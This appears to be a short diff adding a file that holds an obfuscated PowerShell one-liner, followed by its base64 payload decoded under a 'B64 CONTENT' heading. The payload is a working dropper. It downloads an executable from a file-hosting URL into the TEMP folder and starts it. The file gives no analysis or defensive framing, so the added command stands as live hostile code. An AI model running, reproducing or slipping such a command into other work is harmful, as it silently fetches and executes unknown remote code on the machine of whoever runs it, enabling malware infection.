@@ -1,0 +1,7 @@
+iex([systEM.tEXt.eNCODiNg]::utf8.gEtSTrIng([sYsTem.CoNveRT]::fROmbasE64STRiNG('CihOZXctT2JqZWN0IFNZU3RFbS5uRXQud0VCQ2xJRU5UKS5kT1dOTE9hZGZpbGUoJ2h0dHBzOi8vYS5wb21mLmNhdC92amFkd2IuZXhlJywiJGVuVjpURU1QXGV1aW9rby5leGUiKTtTdGFydC1Qcm9jZXNzICgiJGVuVjpURU1QXGV1aW9rby5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYStEm.nEt.wEBClIENT).dOWNLOadfile('https://a.pomf.cat/vjadwb.exe',"$enV:TEMP\euioko.exe");Start-Process ("$enV:TEMP\euioko.exe")
+
